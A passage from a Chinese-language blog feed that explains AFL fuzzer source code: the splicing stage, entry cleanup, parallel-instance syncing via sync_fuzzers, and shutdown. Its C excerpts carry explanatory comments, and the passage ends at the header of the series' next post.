class="comment">// 最后一个差异位置，初始化为-1表示未找到</span></span><br><span class="line">  u32 pos;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 逐字节比较两个内存区域</span></span><br><span class="line">  <span class="keyword">for</span> (pos = <span class="number">0</span>; pos &lt; len; pos++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(ptr1++) != *(ptr2++)) &#123;  <span class="comment">// 如果当前字节不同</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f_loc == <span class="number">-1</span>)  <span class="comment">// 如果是第一次发现差异</span></span><br><span class="line">        f_loc = pos;    <span class="comment">// 记录第一个差异位置</span></span><br><span class="line">      l_loc = pos;      <span class="comment">// 更新最后一个差异位置</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *first = f_loc;  <span class="comment">// 将第一个差异位置写入输出参数</span></span><br><span class="line">  *last = l_loc;   <span class="comment">// 将最后一个差异位置写入输出参数</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数可以找到差异的位置，例如：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">位置:     <span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span></span><br><span class="line">in_buf:  [A B C D E F G H]</span><br><span class="line">new_buf: [A B X Y Z F G H]</span><br><span class="line">差异:        ↑ ↑ ↑ ↑ ↑</span><br></pre></td></tr></table></figure><p><strong>比较结果:</strong></p><ul><li>位置0-1: 相同 (A, B)</li><li>位置2: <strong>第一个差异</strong> → <code>f_diff = 2</code> (C ≠ X)</li><li>位置3-4: 继续不同 (D≠Y, E≠Z)</li><li>位置5: <strong>最后一个差异</strong> → <code>l_diff = 5</code> (因为位置6-7又相同了)</li></ul><p>然后进行校验，保证*f_diff <em>&gt;= 0，</em>l_diff *&gt;= 2，且二者不相等，如果满足了就继续，否则继续寻找。</p><p>接下来寻找拼接点，在<em>f diff</em>与<em>l diff</em>之间随机一点拼接，假设随机数生成结果为 <code>1</code></p><p>则拼接结果为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">new_buf: [A B C | Y Z F G H]</span><br></pre></td></tr></table></figure><p>前半部分使用前测试用例，后半使用目标测试用例。</p><p>这部分代码我附在下面：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">retry_splicing:</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ===== 拼接(Splicing)阶段入口条件检查 =====</span></span><br><span class="line">  <span class="comment">// 条件1: use_splicing - 拼接功能已启用</span></span><br><span class="line">  <span class="comment">// 条件2: splice_cycle++ &lt; SPLICE_CYCLES - 拼接循环次数未超过限制</span></span><br><span class="line">  <span class="comment">// 条件3: queued_paths &gt; 1 - 队列中至少有2个测试用例(需要拼接对象)</span></span><br><span class="line">  <span class="comment">// 条件4: queue_cur-&gt;len &gt; 1 - 当前测试用例长度大于1字节(可拼接)</span></span><br><span class="line">  <span class="keyword">if</span> (use_splicing &amp;&amp; splice_cycle++ &lt; SPLICE_CYCLES &amp;&amp; queued_paths &gt; <span class="number">1</span> &amp;&amp;</span><br><span class="line">      queue_cur-&gt;len &gt; <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">target</span>;</span>  <span class="comment">// 目标测试用例指针</span></span><br><span class="line">    u32 tid, split_at;           <span class="comment">// tid: 目标ID, split_at: 拼接点位置</span></span><br><span class="line">    u8 *new_buf;                 <span class="comment">// 存储目标测试用例内容的新缓冲区</span></span><br><span class="line">    s32 f_diff, l_diff;          <span class="comment">// f_diff: 第一个差异字节位置, l_diff: 最后一个差异字节位置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 步骤1: 恢复原始输入缓冲区 ===== */</span></span><br><span class="line">    <span class="comment">/* 如果之前在havoc阶段修改过in_buf，需要先释放并恢复原始状态 */</span></span><br><span class="line">    <span class="keyword">if</span> (in_buf != orig_in) &#123;</span><br><span class="line">      ck_free(in_buf);           <span class="comment">// 释放被修改的缓冲区</span></span><br><span class="line">      in_buf = orig_in;          <span class="comment">// 恢复为原始输入</span></span><br><span class="line">      len = queue_cur-&gt;len;      <span class="comment">// 恢复原始长度</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 步骤2: 随机选择拼接目标 ===== */</span></span><br><span class="line">    <span class="comment">/* 从队列中随机选择一个测试用例作为拼接对象，但不能选择自己 */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      tid = UR(queued_paths);    <span class="comment">// UR()生成[0, queued_paths)范围内的随机数</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (tid == current_entry); <span class="comment">// 确保不与自己拼接</span></span><br><span class="line"></span><br><span class="line">    splicing_with = tid;         <span class="comment">// 记录拼接对象的ID(用于统计)</span></span><br><span class="line">    target = <span class="built_in">queue</span>;              <span class="comment">// 从队列头开始</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 步骤3: 快速定位到目标队列条目 ===== */</span></span><br><span class="line">    <span class="comment">/* 使用两级跳跃优化：先按100步跳跃，再逐个遍历 */</span></span><br><span class="line">    <span class="comment">// 第一级：每次跳过100个条目(通过next_100快速指针)</span></span><br><span class="line">    <span class="keyword">while</span> (tid &gt;= <span class="number">100</span>) &#123;</span><br><span class="line">      target = target-&gt;next_100; <span class="comment">// 跳到100个条目后的位置</span></span><br><span class="line">      tid -= <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 第二级：逐个遍历剩余的条目</span></span><br><span class="line">    <span class="keyword">while</span> (tid--)</span><br><span class="line">      target = target-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 步骤4: 验证目标有效性 ===== */</span></span><br><span class="line">    <span class="comment">/* 确保目标满足以下条件:</span></span><br><span class="line"><span class="comment">       1. 长度至少为2字节(太短无法拼接)</span></span><br><span class="line"><span class="comment">       2. 不是当前测试用例本身(避免自拼接) */</span></span><br><span class="line">    <span class="keyword">while</span> (target &amp;&amp; (target-&gt;len &lt; <span class="number">2</span> || target == queue_cur)) &#123;</span><br><span class="line">      target = target-&gt;next;     <span class="comment">// 跳到下一个条目</span></span><br><span class="line">      splicing_with++;           <span class="comment">// 更新拼接对象ID</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果遍历到队列末尾都没找到合适的目标，重新选择</span></span><br><span class="line">    <span class="keyword">if</span> (!target)</span><br><span class="line">      <span class="keyword">goto</span> retry_splicing;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 步骤5: 读取目标测试用例内容 ===== */</span></span><br><span class="line">    fd = open(target-&gt;fname, O_RDONLY);  <span class="comment">// 以只读方式打开目标文件</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, target-&gt;fname);  <span class="comment">// 打开失败则致命错误</span></span><br><span class="line"></span><br><span class="line">    new_buf = ck_alloc_nozero(target-&gt;len);  <span class="comment">// 分配缓冲区(不清零以提高性能)</span></span><br><span class="line"></span><br><span class="line">    ck_read(fd, new_buf, target-&gt;len, target-&gt;fname);  <span class="comment">// 读取完整文件内容</span></span><br><span class="line"></span><br><span class="line">    close(fd);  <span class="comment">// 关闭文件描述符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 步骤6: 定位差异范围 ===== */</span></span><br><span class="line">    <span class="comment">/* 找到当前测试用例和目标测试用例之间:</span></span><br><span class="line"><span class="comment">       - f_diff: 第一个不同字节的位置</span></span><br><span class="line"><span class="comment">       - l_diff: 最后一个不同字节的位置</span></span><br><span class="line"><span class="comment">       只比较两者中较短的长度部分 */</span></span><br><span class="line">    locate_diffs(in_buf, new_buf, MIN(len, target-&gt;len), &amp;f_diff, &amp;l_diff);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 步骤7: 验证差异有效性 ===== */</span></span><br><span class="line">    <span class="comment">/* 拼接需要满足以下条件:</span></span><br><span class="line"><span class="comment">       1. f_diff &gt;= 0: 存在差异(不是完全相同的文件)</span></span><br><span class="line"><span class="comment">       2. l_diff &gt;= 2: 最后差异位置至少在第2字节(有足够的差异范围)</span></span><br><span class="line"><span class="comment">       3. f_diff != l_diff: 差异不止一个字节(至少有2个字节不同)</span></span><br><span class="line"><span class="comment">       如果不满足，放弃此次拼接，重新选择目标 */</span></span><br><span class="line">    <span class="keyword">if</span> (f_diff &lt; <span class="number">0</span> || l_diff &lt; <span class="number">2</span> || f_diff == l_diff) &#123;</span><br><span class="line">      ck_free(new_buf);          <span class="comment">// 释放目标缓冲区</span></span><br><span class="line">      <span class="keyword">goto</span> retry_splicing;       <span class="comment">// 重新尝试拼接</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 步骤8: 选择拼接点 ===== */</span></span><br><span class="line">    <span class="comment">/* 在第一个和最后一个差异字节之间随机选择一个位置作为拼接点</span></span><br><span class="line"><span class="comment">       公式: split_at = f_diff + random(0, l_diff - f_diff)</span></span><br><span class="line"><span class="comment">       这样可以保证拼接点在有差异的区域内 */</span></span><br><span class="line">    split_at = f_diff + UR(l_diff - f_diff);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 步骤9: 执行拼接操作 ===== */</span></span><br><span class="line">    <span class="comment">/* 拼接策略: </span></span><br><span class="line"><span class="comment">       - 前半部分[0, split_at): 使用当前测试用例(in_buf)</span></span><br><span class="line"><span class="comment">       - 后半部分[split_at, end): 使用目标测试用例(new_buf) */</span></span><br><span class="line">    len = target-&gt;len;           <span class="comment">// 使用目标测试用例的长度</span></span><br><span class="line">    <span class="built_in">memcpy</span>(new_buf, in_buf, split_at);  <span class="comment">// 将当前测试用例的前split_at字节复制到new_buf</span></span><br><span class="line">                                        <span class="comment">// (覆盖new_buf的前半部分，保留后半部分)</span></span><br><span class="line">    in_buf = new_buf;            <span class="comment">// 更新输入缓冲区指针为拼接后的结果</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 步骤10: 准备输出缓冲区 ===== */</span></span><br><span class="line">    ck_free(out_buf);            <span class="comment">// 释放旧的输出缓冲区</span></span><br><span class="line">    out_buf = ck_alloc_nozero(len);  <span class="comment">// 分配新的输出缓冲区</span></span><br><span class="line">    <span class="built_in">memcpy</span>(out_buf, in_buf, len);    <span class="comment">// 复制拼接后的内容到输出缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 跳转到havoc阶段 ===== */</span></span><br><span class="line">    <span class="comment">/* 拼接完成后，跳转到havoc阶段对拼接结果进行进一步的随机变异 */</span></span><br><span class="line">    <span class="keyword">goto</span> havoc_stage;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !IGNORE_FINDS */</span></span></span><br><span class="line"></span><br><span class="line">  ret_val = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h3 id="最后处理阶段"><a href="#最后处理阶段" class="headerlink" title="最后处理阶段"></a>最后处理阶段</h3><p>接下来就是最后处理阶段，就是做一些收尾的工作，如果提前结束的也会跳转到这里：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">abandon_entry:</span><br><span class="line">  splicing_with = <span class="number">-1</span>;  <span class="comment">// 重置拼接标志，-1表示不与任何测试用例进行拼接</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果通过了校准周期且之前没见过这个条目，</span></span><br><span class="line"><span class="comment">     更新pending_not_fuzzed计数 */</span></span><br><span class="line">  <span class="keyword">if</span> (!stop_soon &amp;&amp; !queue_cur-&gt;cal_failed &amp;&amp; !queue_cur-&gt;was_fuzzed) &#123;</span><br><span class="line">    <span class="comment">// stop_soon: 程序没有收到停止信号</span></span><br><span class="line">    <span class="comment">// cal_failed: 校准(calibration)没有失败</span></span><br><span class="line">    <span class="comment">// was_fuzzed: 之前没有被fuzz过</span></span><br><span class="line">    </span><br><span class="line">    queue_cur-&gt;was_fuzzed = <span class="number">1</span>;  <span class="comment">// 标记当前队列条目已经被fuzz过</span></span><br><span class="line">    pending_not_fuzzed--;        <span class="comment">// 减少待fuzz的条目计数</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (queue_cur-&gt;favored)      <span class="comment">// 如果这是一个favored(优选)的测试用例</span></span><br><span class="line">      pending_favored--;         <span class="comment">// 减少待fuzz的优选条目计数</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 清理资源 */</span></span><br><span class="line">  munmap(orig_in, queue_cur-&gt;len);  <span class="comment">// 解除原始输入数据的内存映射</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (in_buf != orig_in)  <span class="comment">// 如果输入缓冲区和原始输入不是同一块内存</span></span><br><span class="line">    ck_free(in_buf);      <span class="comment">// 释放输入缓冲区（可能经过了变异处理）</span></span><br><span class="line">  </span><br><span class="line">  ck_free(out_buf);  <span class="comment">// 释放输出缓冲区</span></span><br><span class="line">  ck_free(eff_map);  <span class="comment">// 释放effector map（用于记录哪些字节对执行路径有影响）</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> ret_val;  <span class="comment">// 返回结果值</span></span><br></pre></td></tr></table></figure><p>经过漫长的循环fuzz过程，我们终于是结束了fuzz_one函数，接下来回到主循环中，</p><p>接下来是定期同步，这里是针对针对<strong>所有参与并行fuzzing的实例</strong>，包括master和slave。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">  <span class="comment">// SYNC_INTERVAL 定义同步间隔</span></span><br><span class="line">  <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">    sync_fuzzers(use_argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里简单说说<strong>sync_fuzzers</strong></p><h2 id="sync-fuzzers"><a href="#sync-fuzzers" class="headerlink" title="sync_fuzzers"></a>sync_fuzzers</h2><p>这个函数是一个同步函数，在master-slave模式中，不同fuzzer实例之间会进行同步，会互相执行对方的有趣样例，如果对自己也是有趣样例就保存下来，如果不是就不会保存，这个在之前的代码中有体现，这里就不详细赘述了。这里着重说一下其最重要的如何判断运行了哪些测试样例：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">slave1/.synced/master1 文件内容：</span><br><span class="line"></span><br><span class="line">字节表示：[<span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">十进制值：<span class="number">42</span></span><br><span class="line"></span><br><span class="line">含义：slave1已经处理过master1的ID <span class="number">0</span><span class="number">-41</span>的所有测试用例</span><br><span class="line"></span><br><span class="line">下次同步时：</span><br><span class="line"><span class="keyword">while</span> ((qd_ent = readdir(qd))) &#123;</span><br><span class="line">    <span class="built_in">sscanf</span>(qd_ent-&gt;d_name, <span class="string">&quot;id:%06u&quot;</span>, &amp;syncing_case);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (syncing_case &lt; min_accept)</span><br><span class="line">        <span class="keyword">continue</span>;  <span class="comment">// 跳过ID &lt; 42的，因为已经处理过</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 只处理ID &gt;= 42的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个实例文件夹中都会有.synced文件夹，其中包含各个fuzzer实例的同步情况，比如上面就是处理到了ID：42，这样下次接着处理就行了，我简单对函数注释一下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sync_fuzzers</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  DIR *sd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">sd_ent</span>;</span></span><br><span class="line">  u32 sync_cnt = <span class="number">0</span>; <span class="comment">// 统计已同步的fuzzer数量</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 打开同步目录</span></span><br><span class="line">  sd = opendir(sync_dir);</span><br><span class="line">  <span class="keyword">if</span> (!sd)</span><br><span class="line">    PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, sync_dir);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化阶段统计信息</span></span><br><span class="line">  stage_max = stage_cur = <span class="number">0</span>;</span><br><span class="line">  cur_depth = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 遍历同步目录中其他fuzzer实例创建的条目 */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ((sd_ent = readdir(sd))) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> u8 stage_tmp[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">    DIR *qd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">qd_ent</span>;</span></span><br><span class="line">    u8 *qd_path, *qd_synced_path;</span><br><span class="line">    u32 min_accept = <span class="number">0</span>, next_min_accept; <span class="comment">// 记录已处理的最小测试用例ID</span></span><br><span class="line"></span><br><span class="line">    s32 id_fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 跳过隐藏文件（.开头）和自己的输出目录 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sd_ent-&gt;d_name[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span> || !<span class="built_in">strcmp</span>(sync_id, sd_ent-&gt;d_name))</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 跳过没有queue/子目录的条目（非有效fuzzer目录） */</span></span><br><span class="line"></span><br><span class="line">    qd_path = alloc_printf(<span class="string">&quot;%s/%s/queue&quot;</span>, sync_dir, sd_ent-&gt;d_name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(qd = opendir(qd_path))) &#123;</span><br><span class="line">      ck_free(qd_path);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取上次已处理的测试用例ID */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造同步状态文件路径：.synced/目录下以fuzzer名称命名的文件</span></span><br><span class="line">    qd_synced_path = alloc_printf(<span class="string">&quot;%s/.synced/%s&quot;</span>, out_dir, sd_ent-&gt;d_name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开或创建同步状态文件</span></span><br><span class="line">    id_fd = open(qd_synced_path, O_RDWR | O_CREAT, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (id_fd &lt; <span class="number">0</span>)</span><br><span class="line">      PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, qd_synced_path);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取上次处理到的ID，如果读取成功则重置文件指针准备更新</span></span><br><span class="line">    <span class="keyword">if</span> (read(id_fd, &amp;min_accept, <span class="keyword">sizeof</span>(u32)) &gt; <span class="number">0</span>)</span><br><span class="line">      lseek(id_fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">    next_min_accept = min_accept; <span class="comment">// 记录本次将要更新的ID</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 显示统计信息 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(stage_tmp, <span class="string">&quot;sync %u&quot;</span>, ++sync_cnt);</span><br><span class="line">    stage_name = stage_tmp;</span><br><span class="line">    stage_cur = <span class="number">0</span>;</span><br><span class="line">    stage_max = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 遍历该fuzzer队列中的所有文件，解析ID并判断是否已处理过；</span></span><br><span class="line"><span class="comment">       如果是新测试用例，则执行它 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((qd_ent = readdir(qd))) &#123;</span><br><span class="line"></span><br><span class="line">      u8 *path;</span><br><span class="line">      s32 fd;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 跳过隐藏文件、解析文件名格式（id:XXXXXX），并跳过已处理的ID</span></span><br><span class="line">      <span class="keyword">if</span> (qd_ent-&gt;d_name[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span> ||</span><br><span class="line">          <span class="built_in">sscanf</span>(qd_ent-&gt;d_name, CASE_PREFIX <span class="string">&quot;%06u&quot;</span>, &amp;syncing_case) != <span class="number">1</span> ||</span><br><span class="line">          syncing_case &lt; min_accept)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 找到新测试用例，准备尝试执行 */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 更新下次要处理的最小ID</span></span><br><span class="line">      <span class="keyword">if</span> (syncing_case &gt;= next_min_accept)</span><br><span class="line">        next_min_accept = syncing_case + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      path = alloc_printf(<span class="string">&quot;%s/%s&quot;</span>, qd_path, qd_ent-&gt;d_name);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 允许打开失败（可能其他fuzzer正在恢复等） */</span></span><br><span class="line"></span><br><span class="line">      fd = open(path, O_RDONLY);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ck_free(path);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fstat(fd, &amp;st))</span><br><span class="line">        PFATAL(<span class="string">&quot;fstat() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 忽略空文件或超大文件 */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (st.st_size &amp;&amp; st.st_size &lt;= MAX_FILE) &#123;</span><br><span class="line"></span><br><span class="line">        u8 fault;</span><br><span class="line">        <span class="comment">// 将测试用例文件映射到内存</span></span><br><span class="line">        u8 *mem = mmap(<span class="number">0</span>, st.st_size, PROT_READ, MAP_PRIVATE, fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mem == MAP_FAILED)</span><br><span class="line">          PFATAL(<span class="string">&quot;Unable to mmap &#x27;%s&#x27;&quot;</span>, path);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 执行测试用例，依赖save_if_interesting()捕获重要错误并保存 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将测试用例写入目标程序的输入文件</span></span><br><span class="line">        write_to_testcase(mem, st.st_size);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行目标程序</span></span><br><span class="line">        fault = run_target(argv, exec_tmout);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查是否收到停止信号</span></span><br><span class="line">        <span class="keyword">if</span> (stop_soon)</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 标记当前同步来源，如果测试用例有趣则保存</span></span><br><span class="line">        syncing_party = sd_ent-&gt;d_name;</span><br><span class="line">        queued_imported += save_if_interesting(argv, mem, st.st_size, fault);</span><br><span class="line">        syncing_party = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解除内存映射</span></span><br><span class="line">        munmap(mem, st.st_size);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定期更新统计显示</span></span><br><span class="line">        <span class="keyword">if</span> (!(stage_cur++ % stats_update_freq))</span><br><span class="line">          show_stats();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      ck_free(path);</span><br><span class="line">      close(fd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个函数结束后，主循环就剩最后一点检查和处理，就可以进行下一个了，至此主循环就结束了。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ===== 6. 退出检查 ===== */</span></span><br><span class="line"><span class="keyword">if</span> (!stop_soon &amp;&amp; exit_1)</span><br><span class="line">  stop_soon = <span class="number">2</span>; <span class="comment">// 程序化退出标记</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (stop_soon)</span><br><span class="line">  <span class="keyword">break</span>; <span class="comment">// 退出主循环</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ===== 7. 移动到下一个队列条目 ===== */</span></span><br><span class="line">queue_cur = queue_cur-&gt;next;</span><br><span class="line">current_entry++;</span><br></pre></td></tr></table></figure><p>最后就是主循环只外，用户中断和程序化结束的一些内容了，无关核心逻辑，自此AFL基本上就完全结束了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/* 如果还有当前队列项，显示最终统计 */</span></span><br><span class="line">  <span class="keyword">if</span> (queue_cur)</span><br><span class="line">    show_stats();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 进程清理 =====</span></span><br><span class="line"><span class="comment">   * stop_soon == 2 表示程序化停止（非用户中断）</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (stop_soon == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>)</span><br><span class="line">      kill(child_pid, SIGKILL); <span class="comment">// 终止子进程（被测试程序）</span></span><br><span class="line">    <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>)</span><br><span class="line">      kill(forksrv_pid, SIGKILL); <span class="comment">// 终止fork服务器</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 等待fork服务器结束，以获取资源使用统计 */</span></span><br><span class="line">  <span class="keyword">if</span> (waitpid(forksrv_pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    WARNF(<span class="string">&quot;error waitpid\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 保存最终状态 ===== */</span></span><br><span class="line">  write_bitmap();            <span class="comment">// 写入覆盖率位图</span></span><br><span class="line">  write_stats_file(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 写入统计文件</span></span><br><span class="line">  save_auto();               <span class="comment">// 自动保存</span></span><br><span class="line"></span><br><span class="line">stop_fuzzing: <span class="comment">// 跳转标签</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 输出结束信息 */</span></span><br><span class="line">  SAYF(CURSOR_SHOW cLRD <span class="string">&quot;\n\n+++ Testing aborted %s +++\n&quot;</span> cRST,</span><br><span class="line">       stop_soon == <span class="number">2</span> ? <span class="string">&quot;programmatically&quot;</span> : <span class="string">&quot;by user&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 警告信息 =====</span></span><br><span class="line"><span class="comment">   * 如果运行超过30分钟但还在第一个循环，可能结果不完整</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (queue_cycle == <span class="number">1</span> &amp;&amp; get_cur_time() - start_time &gt; <span class="number">30</span> * <span class="number">60</span> * <span class="number">1000</span>) &#123;</span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cYEL <span class="string">&quot;[!] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Stopped during the first cycle, results may be incomplete.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    (For info on resuming, see %s/README.)\n&quot;</span>,</span><br><span class="line">         doc_path);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 资源释放 ===== */</span></span><br><span class="line">  fclose(plot_file);    <span class="comment">// 关闭绘图文件</span></span><br><span class="line">  destroy_queue();      <span class="comment">// 销毁测试队列</span></span><br><span class="line">  destroy_extras();     <span class="comment">// 销毁额外的字典条目</span></span><br><span class="line">  ck_free(target_path); <span class="comment">// 释放目标路径内存</span></span><br><span class="line">  ck_free(sync_id);     <span class="comment">// 释放同步ID内存</span></span><br><span class="line"></span><br><span class="line">  alloc_report(); <span class="comment">// 输出内存分配报告</span></span><br><span class="line"></span><br><span class="line">  OKF(<span class="string">&quot;We&#x27;re done here. Have a nice day!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>以上就是AFL的全部核心内容了，希望对各位看到师傅有些许帮助，如果有什么问题还请指出。</p>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL代码详读（上）</title>
      <link href="/2025/07/14/AFL%E4%BB%A3%E7%A0%81%E8%AF%A6%E8%AF%BB%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
      <url>/2025/07/14/AFL%E4%BB%A3%E7%A0%81%E8%AF%A6%E8%AF%BB%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
      
